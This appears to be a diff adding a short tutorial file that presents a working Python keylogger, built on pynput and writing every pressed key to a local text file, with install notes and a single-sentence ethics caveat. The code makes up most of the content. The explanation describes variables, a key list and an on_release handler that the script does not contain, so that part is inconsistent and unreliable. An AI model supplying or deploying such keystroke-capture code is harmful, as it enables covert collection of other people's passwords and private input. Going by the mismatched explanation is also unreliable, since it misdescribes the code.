@@ -1,0 +1,58 @@
+
+___SIMPLE KEYLOGGER__
+
+=============
+Instructions:
+=============
+
+Create a basic keylogger program that records and logs keystrokes. Focus on logging the keys pressed and saving them to a file. Note: Ethical considerations and permissions are crucial for projects involving keyloggers.
+
+=============
+Python Script:
+=============
+
+from pynput import keyboard 
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logkey:
+        try:
+            char = key.char
+            logkey.write(char)
+        except:
+            print("Error getting char")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+    input()
+
+=============
+Explanation:
+=============
+
+Imports:
+- ‘from pynput import keyboard’: Imports the necessary modules from the pynput library to handle keyboard events.
+
+Log File:
+- ‘log_file = ""keyfile.txt"”’: Specifies the file where keystrokes will be saved.
+
+log Key:
+'keys = []:’ Initializes a list to store keystrokes temporarily.
+
+Key Press Callback:
+- on_press(key): Function called whenever a key is pressed. It appends the key to the list and writes it to the file.
+
+
+Start the Listener:
+- with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: Starts the keyboard listener to capture keystrokes.
+
+
+
+=============
+ Key Notes::
+=============
+
+1. To install Pynput on terminal initiate --- “pip install pynput”
+
+2. Run the program.
